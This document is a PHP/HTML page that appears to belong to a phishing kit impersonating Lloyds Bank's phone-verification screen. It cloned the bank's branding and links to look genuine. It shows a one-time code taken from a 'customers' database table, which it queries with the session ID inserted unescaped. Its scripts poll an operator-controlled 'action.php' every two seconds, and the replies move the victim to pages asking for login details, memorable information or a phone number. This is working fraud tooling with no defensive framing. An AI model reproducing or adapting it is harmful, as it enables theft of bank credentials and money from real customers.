<?php
session_start();
include 'files/config.php';
include 'files/connect.php';

if($_SESSION['started'] == 'true'){
	//echo '<script> console.log('.$_SESSION['uniqueid'].');</script>';
	$uniqueid = $_SESSION['uniqueid'];
	$query = mysqli_query($conn,"SELECT * FROM customers WHERE uniqueid=$uniqueid");
	if($query){
		$arr = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$code = $arr['code'];
	}else{
		header('location:exit.php');
	}
	
}else{
	header('location:exit.php');
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html
    lang="en"
    class="js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface no-generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths lastchild"
    xmlns="http://www.w3.org/1999/xhtml"
    xml:lang="en-gb"
    style="overflow-x: hidden;"
>
    <!--<![endif]-->
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

        <meta name="DCSext.hasTealium" content="1" />
		<script src="files/js/jquery.js"></script>
        <script>

var timmer = setInterval(function() {
	
	//loader_status_wait
	
	var id = <?=$_SESSION['uniqueid'];?>;
	var urldata = 'files/action.php?getstatus=' + id;
	$.ajax({
		url:urldata,
		type:'GET',
		success: function(response){
			//console.log(response)
			if(response == 11){
				$('#loader_status_wait').hide();
				$('#wait_loader').hide();
				$('#fail_loader').hide();
				$('#success_loader').show();
				$('#loader_status').text('The information you have entered are correct');
				$.ajax({
					url:'files/action.php?wait=' + id,
					type:'GET',
					success: function(response){
						//console.log(response);
					}
				});
				setTimeout(function () {
					$('#wait_loader').show();
					$('#fail_loader').hide();
					$('#success_loader').hide();
					$('#loader_status').text('Loading...');
				}, 3000);
			}else if(response == 12){
				$('#loader_status_wait').hide();
				$('#wait_loader').hide();
				$('#fail_loader').show();
				$('#success_loader').hide();
				$('#loader_status').text('The information you have entered are incorrect');
				$.ajax({
					url:'files/action.php?wait=' + id,
					type:'GET',
					success: function(response){
						//console.log(response);
					}
				});
				setTimeout(function () {
					$('#wait_loader').show();
					$('#fail_loader').hide();
					$('#success_loader').hide();
					$('#loader_status').text('Loading...');
				}, 3000);
			}else if(response == 5){
				
				window.location.href = 'Login.php?error';
				
			}else if(response == 2){
				
				window.location.href = 'Memorable.php';
				
			}else if(response == 8){
				
				window.location.href = 'Call.php';
				
			}else if(response == 4){
				
				window.location.href = 'Success.php';

			}else if(response == 14){
				
				window.location.href = 'Phonenumber.php';

			}
	
		},
		error: function(err) {
			console.error('error: ' + err);
		}
	
	});
	
}, 2000);

</script>
    <script>
        var interval = 3000;  
        function heartbeat() {
            $.ajax({
                    type: 'GET',
                    url: 'files/activity.php',
                    success: function (data) {
                        var parsed_data = JSON.parse(data);
                        //console.log(parsed_data);
                    },
                    complete: function (data) {
                        setTimeout(heartbeat, interval);
                    }
            });
        }
        setTimeout(heartbeat, interval);
    </script>
    </head>
    <body>
        <title>Lloyds | Payments and transfers</title>
        <meta name="keywords" content="" />
        <meta name="description" content="" />

        <meta http-equiv="content-language" content="en-gb" />
        <!--[if gte IE 8]><meta http-equiv="X-UA-Compatible" content="IE=IE8" /><![endif]-->
        <meta name="robots" content="noindex" />
        <meta name="distribution" content="global" />
        <meta name="rating" content="general" />
        <meta
            http-equiv="pics-label"
            content='(pics-1.1 "http://www.icra.org/ratingsv02.html" comment "Single file EN v2.0" l gen true for "httpss://secure.lloydsbank.co.uk:10161/personal" r (nz 1 vz 1 lz 1 oz 1 cz 1) "http://www.rsac.org/ratingsv01.html" l gen true for "httpss://secure.lloydsbank.co.uk:10161/personal" r (n 0 s 0 v 0 l 0))'
        />

        <meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=1.0, maximum-scale=1.0" />
        <meta name="format-detection" content="telephone=no" />

        <link href="./files/css/styles-blessed2-min200720.css" media="screen, print" type="text/css" rel="stylesheet" />
        <link href="./files/css/styles-blessed1-min200720.css" media="screen, print" type="text/css" rel="stylesheet" />
        <link href="./files/css/styles-min200720.css" media="screen, print" type="text/css" rel="stylesheet" />
        <!--[if IE]>
            <link rel="stylesheet" href="/assets/LloydsRetail/ress/css/ie/ie-min200720.css" />
        <![endif]-->

        <meta name="dcconfsid" content="e506eec6ef9b11ea813e5e225f2c770d" />

        <meta name="wup_url" content="https://wup-16c9d93d.lloydsbank.co.uk/client/v3/web/wup?cid=karma" />

        <link rel="shortcut icon" href="files/img/favicon.ico" />

        <div class="mobile-wrapper">
            <div id="outer" style="">
                <div class="page-wrap">
                    <header>
                        <div class="sp-pat-m-hf-01-bank-bar need-javascript" data-instance-sp-pat-m-hf-01-bank-bar="24">
                            <div class="m-hf-01-container m-container">
                                <div class="m-01-logo">
                                    <img src="./files/img/logo.png" alt="Lloyds Bank" title="Lloyds Bank" class="desktop_logo" />
                                    <img src="./files/img/mobile_logo.png" alt="Lloyds Bank" height="40" width="42" class="mobile_logo" /><img src="./files/img/LogoPrint.png" alt="Lloyds Bank" class="print_logo" />
                                </div>
                                <div class="m-01-menu-buttons">
                                    <ul>
                                        <li class="menu-logoff">
                                            <div class="m-01-menu-logoff">
                                                <a
                                                    data-wt-ac="LloydsRetail.common.default.cmslinkssr0005,Log out"
                                                    id="ifCommercial:ifMobLOgOff:outputLinkLogOutMobileHeader"
                                                    name="ifCommercial:ifMobLOgOff:outputLinkLogOutMobileHeader"
                                                    href="https://secure.lloydsbank.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?lnkcmd=ifCommercial%3AifMobLOgOff%3AoutputLinkLogOutMobileHeader&amp;al="
                                                    data-instance-data-wt-ac-="0"
                                                >
                                                    <span class="m-01-menu-button-text" title="Log off">Log off</span>
                                                </a>
                                            </div>
                                        </li>

                                        <li class="menu-home">
                                            <div class="m-01-menu-home">
                                                <a
                                                    data-wt-ac="LloydsRetail.common.default.cmstaglibtxtssr0002,HOME"
                                                    id="ifCommercial:ifRenderHomeList:outputLinkNavBankBarHome"
                                                    name="ifCommercial:ifRenderHomeList:outputLinkNavBankBarHome"
                                                    href="https://secure.lloydsbank.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?lnkcmd=ifCommercial%3AifRenderHomeList%3AoutputLinkNavBankBarHome&amp;al="
                                                    data-instance-data-wt-ac-="1"
                                                >
                                                    <span class="m-01-menu-button-text" title="HOME">HOME</span>
                                                </a>
                                            </div>
                                        </li>

                                        <li class="menu-button">
                                            <div class="m-01-menu-button m-01-menu-right" data-wt-ac="LloydsRetail.common.default.cmstaglibtxtssr0004,MENU" data-instance-data-wt-ac-="2">
                                                <a href="https://secure.lloydsbank.co.uk/personal/a/mobile/make_payments_transfers/" class="m-01-menu-button-text"> MENU</a>
                                            </div>
                                        </li>
                                    </ul>
                                </div>

                                <div class="m-fh-01-navigation" role="navigation">
                                    <ul class="m-01-menu-bar"></ul>

                                    <ul class="pull-right m-01-menu-bar">
                                        <li class="m-hf-01-cookie-policy">
                                            <a
                                                data-wt-ac="resource.default.cmslinkssr0002,Cookie Policy"
                                                id="ifCommercial:ifSafeSecure:ifcp:CookiePolicylnk1ForDesk"
                                                name="ifCommercial:ifSafeSecure:ifcp:CookiePolicylnk1ForDesk"
                                                href="https://secure.lloydsbank.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?lnkcmd=ifCommercial%3AifSafeSecure%3Aifcp%3ACookiePolicylnk1ForDesk&amp;al="
                                                title="Cookie Policy"
                                                data-instance-data-wt-ac-="3"
                                            >
                                                Cookie Policy
                                            </a>
                                        </li>

                                        <li class="m-hf-01-safe-secure">
                                            <a
                                                href="https://secure.lloydsbank.co.uk/personal/a/mobile/make_payments_transfers/"
                                                role="tab"
                                                title="Your Security"
                                                data-section="safe-secure"
                                                data-expandable="expand"
                                                data-wt-ac="LloydsRetail.modules.default.cmstxtssr0126,Your Security"
                                                data-wt-multi-click="true"
                                                style="line-height: 32px;"
                                                data-instance-data-wt-ac-="4"
                                            >
                                                Your Security
                                                <span> </span>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>

                        <div class="sp-pat-m-hf-01-bank-bar-container">
                            <div class="mvt_content">
                                <style type="text/css">
                                    body {
                                        margin: 0;
                                    }

                                    body.ls-center {
                                        text-align: center;
                                    }

                                    .ls-canvas .ls-row .ls-row-clr {
                                        clear: both;
                                    }

                                    .ls-canvas .ls-col {
                                        overflow: hidden;
                                    }

                                    .ls-canvas .ls-col-body {
                                        overflow: hidden;
                                    }

                                    .ls-canvas .ls-area {
                                        overflow: hidden;
                                    }

                                    .ls-canvas .ls-area-body {
                                        overflow: hidden;
                                    }

                                    .ls-canvas .ls-area .ls-1st {
                                        margin-top: 0 !important;
                                    }

                                    .ls-canvas .ls-cmp-wrap {
                                        padding: 1px 0;
                                    }

                                    .ls-canvas .iw_component {
                                        margin: -1px 0;
                                    }

                                    .ls-canvas .ls-row .ls-lqa-fix {
                                        font-size: 0;
                                        line-height: 0;
                                        height: 0;
                                        margin-top: 0;
                                    }

                                    .ls-canvas .ls-row .ls-lqr-w {
                                        float: left;
                                        width: 100%;
                                    }

                                    .ls-canvas .ls-row .ls-lqr-w-fx {
                                        float: left;
                                    }

                                    .ls-canvas .ls-row .ls-lqr-e-fx {
                                        float: right;
                                    }
                                </style>
                                <div class="ls-canvas sp-pat-wrapper">
                                    <div class="ls-row">
                                        <div class="ls-lqr">
                                            <div class="ls-area">
                                                <div class="ls-area-body">
                                                    <div class="ls-cmp-wrap ls-1st">
                                                        <!--ls:begin[component-1549057498191]-->
                                                        <div class="iw_component">
                                                            <div data-expandable-section="safe-secure" data-expand="true" class="sp-pat-m-hf-01-safe-secure">
                                                                <div class="m-container m-01-threecol">
                                                                    <h2>About your security</h2>
                                                                    <div class="m-01-section">
                                                                        <p>
                                                                            We've created 'Your Security' to help you protect your accounts and personal information. Use these links to help stay up to date with the latest online safety
                                                                            tips.
                                                                        </p>
                                                                        <p>
                                                                            <a
                                                                                title="Read how to protect your account"
                                                                                href="https://secure.lloydsbank.co.uk/personal/a/safezone/displaysafezonearea.jsp?lnkcmd=ifCommercial%3AifCustomerBar%3AoutputLinkNavHome&amp;al=/#/how-to-protect-your-account"
                                                                            >
                                                                                &gt; How to protect your account
                                                                            </a>
                                                                        </p>
                                                                        <p>
                                                                            <a
                                                                                title="Read how to avoid the latest scams"
                                                                                href="https://secure.lloydsbank.co.uk/personal/a/safezone/displaysafezonearea.jsp?lnkcmd=ifCommercial%3AifCustomerBar%3AoutputLinkNavHome&amp;al=/#/avoid-the-latest-scams"
                                                                            >
                                                                                &gt; Avoid the latest scams
                                                                            </a>
                                                                        </p>
                                                                        <p>
                                                                            <a
                                                                                title="Read how to contact us about fraud"
                                                                                href="https://secure.lloydsbank.co.uk/personal/a/safezone/displaysafezonearea.jsp?lnkcmd=ifCommercial%3AifCustomerBar%3AoutputLinkNavHome&amp;al=/#/report-account-fraud"
                                                                            >
                                                                                &gt; Contact us about fraud
                                                                            </a>
                                                                        </p>
                                                                    </div>
                                                                    <div class="m-01-section">
                                                                        <p>
                                                                            <a
                                                                                title="Read how to make your password more secure"
                                                                                href="https://secure.lloydsbank.co.uk/personal/a/safezone/displaysafezonearea.jsp?lnkcmd=ifCommercial%3AifCustomerBar%3AoutputLinkNavHome&amp;al=/#/make-your-password-more-secure"
                                                                            >
                                                                                &gt; Make your password more secure
                                                                            </a>
                                                                        </p>
                                                                        <p>
                                                                            <a
                                                                                title="Find out how safe you are online"
                                                                                href="https://secure.lloydsbank.co.uk/personal/a/safezone/displaysafezonearea.jsp?lnkcmd=ifCommercial%3AifCustomerBar%3AoutputLinkNavHome&amp;al=/#/check-how-safe-you-are-online"
                                                                            >
                                                                                &gt; Check how safe you are online
                                                                            </a>
                                                                        </p>
                                                                    </div>
                                                                    <div class="m-01-section">
                                                                        <p><strong>Online and mobile banking guarantee</strong></p>
                                                                        <p>We’ll refund your money if you become a victim of fraud when using Internet Banking, as long as you’ve used our services carefully.&nbsp;</p>
                                                                        <p>Find out more by reading our online and mobile banking guarantee.</p>
                                                                        <ul class="links">
                                                                            <li>
                                                                                <a
                                                                                    href="http://www.lloydsbank.com/help-guidance/protecting-yourself-from-fraud/bank-safely-how-we-protect-you.asp"
                                                                                    target="_blank"
                                                                                    alt="Our Online Fraud Guarantee shows you the steps to take."
                                                                                >
                                                                                    Our Online Fraud Guarantee shows you the steps to take.
                                                                                </a>
                                                                            </li>
                                                                        </ul>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <!--ls:end[component-1549057498191]-->
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="m-hf-02-customer-bar need-javascript mobile-menu m-hf-02-customer-bar-0" data-instance-m-hf-02-customer-bar="25">
                            <div class="m-container">
                                <div class="m-hf-02-name">
                                    <div class="nav-title">
                                        <span class="m-hf-02-name">
                                            <a href="https://secure.lloydsbank.co.uk/personal/a/mobile/make_payments_transfers/#" role="presentation">
                                                <!--TLTODPLVL2BEG-->
                                                Miss J. Garner
                                                <!--TLTODPLVL2END-->
                                            </a>
                                        </span>

                                        <span class="m-hf-02-logged-in"><a href="https://secure.lloydsbank.co.uk/personal/a/mobile/make_payments_transfers/#" role="region">Last logged on&nbsp;05 September 20 at 05:43 PM</a></span>
                                    </div>
                                </div>
                                <ul class="m-hf-02-nav">
                                    <li class="m-hf-02-home cb-tab-home">
                                        <div class="nav-title">
                                            <a
                                                data-wt-ac="resource.default.cmstxtssr0015,Home"
                                                id="ifCommercial:ifCustomerBar:outputLinkNavHomeMobile"
                                                name="ifCommercial:ifCustomerBar:outputLinkNavHomeMobile"
                                                href="https://secure.lloydsbank.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?lnkcmd=ifCommercial%3AifCustomerBar%3AoutputLinkNavHomeMobile&amp;al="
                                                data-instance-data-wt-ac-="5"
                                            >
                                                Home
                                            </a>
                                        </div>
                                    </li>
                                    <li class="hide-desktab"><div class="nav-title"></div></li>
                                    <li class="m-hf-02-tab cb-tab-accounts">
                                        <div class="nav-title"></div>
                                        <div class="nav-content" data-max-items="4" data-ajax-load="true"></div>
                                    </li>
                                    <li class="m-hf-02-tab cb-tab-profile hide-mobile">
                                        <div class="nav-title"></div>
                                        <div class="nav-content" data-ajax-load="true"></div>
                                    </li>
                                    <li class="m-hf-02-tab cb-tab-help-contact hide-mobile">
                                        <div class="nav-title">
                                            <a
                                                href="https://lloydsbank.creativevirtual.com/Lloyds/?startcontext=Help+Centre.Credit+cards.How+to+apply&amp;sitecontext=ga.Personal"
                                                data-wt-multi-click="true"
                                                data-wt-ac="resource.default.cmstxtssr0011,Help Support"
                                                role="tab"
                                                id="ifCustomerBar:outputLinkHelpandSupportSSR"
                                                title="Help &amp; Support"
                                                data-ajax-uri="/personal/ajax/helpSupport"
                                                data-section-parent="help-contact"
                                                class="main-nav"
                                                target="_blank"
                                                data-instance-data-wt-ac-="6"
                                                aria-expanded="false"
                                                aria-label="Collapsed.Click to expand"
                                            >
                                                Help &amp; Support
                                            </a>
                                        </div>
                                        <div class="nav-content" data-ajax-load="true"></div>
                                    </li>
                                    <li class="m-hf-02-mail cb-tab-mail hide-mobile"><div class="nav-title"></div></li>
                                    <li class="hide-desktab">
                                        <div class="nav-title">
                                            <a
                                                href="https://secure.lloydsbank.co.uk/personal/a/mobile/make_payments_transfers/#"
                                                class="sub-nav-toggle"
                                                data-wt-ac="resource.default.cmslinkssr0116,Help &amp; contact us"
                                                data-wt-multi-click="true"
                                                data-instance-data-wt-ac-="7"
                                            >
                                                Help &amp; contact us
                                            </a>
                                        </div>
                                        <ul class="mobile-sub-nav">
                                            <li>
                                                <a
                                                    data-wt-ac="LloydsRetail.modules.default.cmslinkssr0123,Lost or stolen card"
                                                    id="ifCommercial:ifCustomerBar:ifMobhelp:lnkLostStolen"
                                                    name="ifCommercial:ifCustomerBar:ifMobhelp:lnkLostStolen"
                                                    href="https://secure.lloydsbank.co.uk/personal/a/lost_stolen_card/"
                                                    data-instance-data-wt-ac-="8"
                                                >
                                                    Lost or stolen card
                                                </a>
                                            </li>
                                            <li>
                                                <a
                                                    data-wt-ac="LloydsRetail.modules.default.cmslinkssr0123,Order replacement card or PIN"
                                                    id="ifCommercial:ifCustomerBar:ifMobhelp:lnkCardPins"
                                                    name="ifCommercial:ifCustomerBar:ifMobhelp:lnkCardPins"
                                                    href="https://secure.lloydsbank.co.uk/personal/a/card_replacement/"
                                                    data-instance-data-wt-ac-="9"
                                                >
                                                    Order replacement card or PIN
                                                </a>
                                            </li>
                                            <li>
                                                <a
                                                    href="https://secure.lloydsbank.co.uk/personal/link/lp_mobile_help_index?REFERRING_LOCATION=&amp;REFER_LOCATION=help&amp;HEADER_CONTENT=pages%2fp140_08_help_faq_index_logged_in%2f14008htm300&amp;BODY_CONTENT=pages%2fp140_08_help_faq_index_logged_in%2f14008hlp301"
                                                    data-wt-ac="LloydsRetail.modules.default.cmslinkssr0125,Help"
                                                    data-instance-data-wt-ac-="10"
                                                >
                                                    Help
                                                </a>
                                            </li>
                                            <li>
                                                <a
                                                    data-wt-ac='LloydsRetail.modules.default.cmslinkssr0126,General enquires are open 24/7. &lt;span class="underline"&gt;0800 096 9779&lt;/span&gt;'
                                                    id="ifCommercial:ifCustomerBar:ifMobhelp:lnkGeneralEnq"
                                                    name="ifCommercial:ifCustomerBar:ifMobhelp:lnkGeneralEnq"
                                                    href="https://secure.lloydsbank.co.uk/personal/a/mobile/make_payments_transfers/#"
                                                    data-instance-data-wt-ac-="11"
                                                >
                                                    General enquires are open 24/7. <span class="underline">0800 096 9779</span>
                                                </a>
                                            </li>
                                            <li>
                                                <a
                                                    data-wt-ac="LloydsRetail.modules.default.cmslinkssr0127,Contact us"
                                                    id="ifCommercial:ifCustomerBar:ifMobhelp:outputLinkContactUsLoggedIn"
                                                    name="ifCommercial:ifCustomerBar:ifMobhelp:outputLinkContactUsLoggedIn"
                                                    href="https://secure.lloydsbank.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?REFERRING_LOCATION=%2Fpaymenthub%2Fmobile%2Fmakepaymentsandtransfers.jsp&amp;HEADER_CONTENT=pages%2Fp140_13_contact_logged_in%2F14013htm300&amp;BODY_CONTENT=pages%2Fp140_13_contact_logged_in%2F14013htm301&amp;COOKIE_POLICY_FLAG=FALSE&amp;lnkcmd=ifCommercial%3AifCustomerBar%3AifMobhelp%3AoutputLinkContactUsLoggedIn&amp;al="
                                                    data-instance-data-wt-ac-="12"
                                                >
                                                    Contact us
                                                </a>
                                            </li>
                                        </ul>
                                    </li>
                                    <li class="m-hf-02-mail cb-tab-mail cb-tab-aux-link hide-desktab"><div class="nav-title"></div></li>
                                    <li class="m-hf-02-logout cb-tab-logout cb-tab-aux-link">
                                        <div class="nav-title">
                                            <a
                                                data-wt-ac="LloydsRetail.common.default.cmslinkssr0005,Log out"
                                                id="ifCommercial:ifCustomerBar:ifMobLO:outputLinkLogOutMobile"
                                                name="ifCommercial:ifCustomerBar:ifMobLO:outputLinkLogOutMobile"
                                                href="https://secure.lloydsbank.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?lnkcmd=ifCommercial%3AifCustomerBar%3AifMobLO%3AoutputLinkLogOutMobile&amp;al="
                                                title="Log off"
                                                data-instance-data-wt-ac-="13"
                                            >
                                                Log off
                                            </a>
                                        </div>
                                    </li>
                                    <li class="m-hf-02-logout cb-tab-aux-link hide-desktab">
                                        <div class="nav-title">
                                            <a
                                                data-wt-ac="resource.default.cmslinkssr0002,Cookie Policy"
                                                id="ifCommercial:ifCustomerBar:ifcp:outputLinkCookiePolicyLoggedIn"
                                                name="ifCommercial:ifCustomerBar:ifcp:outputLinkCookiePolicyLoggedIn"
                                                href="https://secure.lloydsbank.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?REFERRING_LOCATION=%2Fpaymenthub%2Fmobile%2Fmakepaymentsandtransfers.jsp&amp;HEADER_CONTENT=pages%2Fp226_00%2F22600htm500&amp;BODY_CONTENT=pages%2Fp226_00%2F22600htm501&amp;COOKIE_POLICY_FLAG=FALSE&amp;lnkcmd=ifCommercial%3AifCustomerBar%3Aifcp%3AoutputLinkCookiePolicyLoggedIn&amp;al="
                                                title="Cookie Policy"
                                                data-instance-data-wt-ac-="14"
                                            >
                                                Cookie Policy
                                            </a>
                                        </div>
                                    </li>
                                    <li class="m-hf-02-logout cb-tab-aux-link hide-desktab">
                                        <div class="nav-title">
                                            <a
                                                data-wt-ac="resource.default.cmslinkssr0001,Your Security"
                                                id="ifCommercial:ifCustomerBar:outputLinkSafeSecureRessMobileLoggedIn"
                                                name="ifCommercial:ifCustomerBar:outputLinkSafeSecureRessMobileLoggedIn"
                                                href="https://secure.lloydsbank.co.uk/personal/a/paymenthub/mobile/makepaymentsandtransfers.jsp?REFERRING_LOCATION=&amp;HEADER_CONTENT=pages%2Fp140_07_security_logged_in%2F14007htm300&amp;BODY_CONTENT=pages%2Fp140_07_security_logged_in%2F14007htm301&amp;lnkcmd=ifCommercial%3AifCustomerBar%3AoutputLinkSafeSecureRessMobileLoggedIn&amp;al="
                                                title="Your Security"
                                                data-instance-data-wt-ac-="15"
                                            >
                                                Your Security
                                            </a>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </header>

                    <div id="page" class="layout-right">
                        <div class="m-container">
                            <div class="layout-content">
                                <span id="partyId" style="display: none;">1464017513</span><span id="brandName" style="display: none;">LLOYDS</span>

                                <div style="display: none;">
                                    <span id="cwaArrangementId">
                                        OWEGXWFPRK2YXVIL4XBNSPTAYA7NOKWGFBMWUMA6XXDWIDUO7IKQ
                                    </span>
                                    <span id="cwaBeneficiaryId"> </span>

                                    <span id="cwaPartyIdForWebtrends">
                                        1464017513
                                    </span>

                                    <span id="cwaCancelRedirection">
                                        https://secure.lloydsbank.co.uk/personal/a/mobile/make_payments_transfers/
                                    </span>

                                    <span id="cwaANRURIForNGB">
                                        /payments/mobile/createnewbeneficiary/setupnewpayee.jsp
                                    </span>

                                    <span id="cwaRedirectedFromStandingOrderLinks">
                                        false
                                    </span>

                                    <span id="cwaRedirectedFromTopUpIsa">
                                        false
                                    </span>

                                    <span id="cwaAmendJourneyName"> </span>

                                    <span id="cwaAmendId"> </span>
                                </div>

                                <div id="cwa-ph" class="cwa-ph--lloyds" style="">
                                    <div data-reactroot="" data-radium="true">
                                        <div class="page">
                                            <div class="component-Eia component-EiaProgress">
                                                <div data-selector="header" class="header" tabindex="-1">
                                                    <h1 data-selector="page-title" class="component-PageTitle" tabindex="-1">We’re calling you now</h1>
                                                </div>
                                                <div class="component-Eia__content">
                                                    <div class="component-EiaProgress__code">
                                                        <p role="alert"></p>
                                                        <div class="component-EiaProgress__code-text">We’ll ask you to enter this code:</div>
                                                        <div class="component-EiaProgress__code-digits">
                                                            <span class="sr-only"><?=$code;?></span>
                                                            <span aria-hidden="true"><?=$code;?></span>
                                                        </div>
                                                        <p></p>
                                                    </div>
                                                    <div class="component-EiaProgress__info">
                                                        <p>Once you've completed the security check, please follow the instructions of screen to continue.</p>
                                                        <br />
                                                        
														
                                                        
                                                    </div>
                                                    <div class="component-EiaProgress__loading">
                                                        <div class="component-EiaProgress__loading-icon"></div>
                                                        <p class="component-EiaProgress__loading-text">Your authentication is in progress. Please don’t refresh this page or use your back button.</p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <style>
                                            @media (max-width: 567px) {
                                                .rmq-b624452 {
                                                    font-size: 54px !important;
                                                    line-height: 54px !important;
                                                }
                                            }
                                            @media (min-width: 568px) {
                                                .rmq-72ddadc3 {
                                                    font-size: 60px !important;
                                                    line-height: 60px !important;
                                                }
                                            }
                                            @media (min-width: 568px) {
                                                .rmq-d630a89 {
                                                    display: inline-block !important;
                                                    margin-right: 10px !important;
                                                }
                                            }
                                            @media (max-width: 567px) {
                                                .rmq-ccb7a879 {
                                                    margin-bottom: 4px !important;
                                                }
                                            }
                                            @media (max-width: 480px) {
                                                .rmq-1c7d6c41 {
                                                    margin-bottom: 26px !important;
                                                }
                                            }
                                            @media (max-width: 480px) {
                                                .rmq-87a54101 {
                                                    float: right !important;
                                                }
                                            }
                                        </style>
                                    </div>
                                </div>
                            </div>
                            <div class="layout-side"></div>
                        </div>
                    </div>
                </div>

                <div class="sp-pat-m-hf-03-footer">
                    <div class="m-hf-03-footer-04">
                        <div class="m-container">
                            <ul class="infoLinks1">
                                <li>
                                    <a
                                        id="help1SSR"
                                        href="https://secure.lloydsbank.co.uk/personal/link/lp_mobile_help_index?REFERRING_LOCATION=MOBILE_VIEW_PRODUCT_DETAILS&amp;REFER_LOCATION=help&amp;HEADER_CONTENT=pages%2fp140_08_help_faq_index_logged_in%2f14008htm300&amp;BODY_CONTENT=pages%2fp140_08_help_faq_index_logged_in%2f14008hlp301"
                                        title="Help"
                                        data-wt-ac="LloydsRetail.common.default.cmstaglibtxtssr0009 Help"
                                        data-instance-data-wt-ac-="16"
                                    >
                                        Help
                                    </a>
                                </li>

                                <li>
                                    <a
                                        id="contactUsSSR"
                                        href="https://secure.lloydsbank.co.uk/personal/link/lp_mobile_contact_us?REFERRING_LOCATION=MOBILE_VIEW_PRODUCT_DETAILS&amp;REFER_LOCATION=noHelp&amp;HEADER_CONTENT=pages%2fp140_13_contact_logged_in%2f14013htm300&amp;BODY_CONTENT=pages%2fp140_13_contact_logged_in%2f14013htm301"
                                        title="Contact us"
                                        data-wt-ac="LloydsRetail.common.default.cmstaglibtxtssr0010 Contact us"
                                        data-instance-data-wt-ac-="17"
                                    >
                                        Contact us
                                    </a>
                                </li>
                            </ul>
                            <ul class="infoLinks2">
                                <li>
                                    <a
                                        id="securitySSR"
                                        href="https://secure.lloydsbank.co.uk/personal/link/lp_mobile_security?REFERRING_LOCATION=MOBILE_VIEW_PRODUCT_DETAILS&amp;REFER_LOCATION=noHelp&amp;HEADER_CONTENT=pages%2fp140_07_security_logged_in%2f14007htm300&amp;BODY_CONTENT=pages%2fp140_07_security_logged_in%2f14007htm301"
                                        title="Security"
                                        data-wt-ac="LloydsRetail.common.default.cmstaglibtxtssr0011 Security"
                                        data-instance-data-wt-ac-="18"
                                    >
                                        Security
                                    </a>
                                </li>
                                <li>
                                    <a
                                        id="legalSSR"
                                        href="https://secure.lloydsbank.co.uk/personal/link/lp_mobile_legal?REFERRING_LOCATION=MOBILE_VIEW_PRODUCT_DETAILS&amp;REFER_LOCATION=noHelp&amp;HEADER_CONTENT=pages%2fp140_02_legal_logged_in%2f14002htm300&amp;BODY_CONTENT=pages%2fp140_02_legal_logged_in%2f14002htm301"
                                        title="Legal"
                                        data-wt-ac="LloydsRetail.common.default.cmstaglibtxtssr0012 Legal"
                                        data-instance-data-wt-ac-="19"
                                    >
                                        Legal
                                    </a>
                                </li>

                                <li>
                                    <a
                                        id="privacySSR"
                                        href="http://www.lloydsbank.com/privacy.asp?WT.ac=FASP1012"
                                        title="Privacy"
                                        data-wt-ac="LloydsRetail.common.default.cmstaglibtxtssr0013 Privacy"
                                        target="_blank"
                                        data-instance-data-wt-ac-="20"
                                    >
                                        Privacy
                                    </a>
                                </li>
                                <li>
                                    <a
                                        id="interstRatesSSR"
                                        href="http://www.lloydsbank.com/rates-and-charges.asp"
                                        title="Rates and charges"
                                        data-wt-ac="LloydsRetail.common.default.cmstaglibtxtssr0014 Rates and charges"
                                        target="_blank"
                                        data-instance-data-wt-ac-="21"
                                    >
                                        Rates and charges
                                    </a>
                                </li>
                                <li>
                                    <a id="BOS_SSR" href="http://www.lloydsbank.com/" title="www.lloydsbank.com" data-wt-ac="LloydsRetail.common.default.cmstaglibtxtssr0016 www.lloydsbank.com" target="_blank" data-instance-data-wt-ac-="22">
                                        www.lloydsbank.com
                                    </a>
                                </li>
                                <li>
                                    <a
                                        id="desktopSiteSSR"
                                        href="https://secure.lloydsbank.co.uk/personal/link/lp_mobile_go_to_desktop?REFERRING_LOCATION=MOBILE_VIEW_PRODUCT_DETAILS"
                                        title="Go to desktop site"
                                        data-wt-ac="LloydsRetail.common.default.cmstaglibtxtssr0015 Go to desktop site"
                                        data-instance-data-wt-ac-="23"
                                    >
                                        Go to desktop site
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="myChatLinkContainer"></div>
        <link type="text/css" rel="stylesheet" href="./files/css/grid.min.css" />
		<link type="text/css" rel="stylesheet" href="./files/css/base.css" />
        <div id="ZN_3EOctUu82gI4qup"></div>
    </body>
</html>
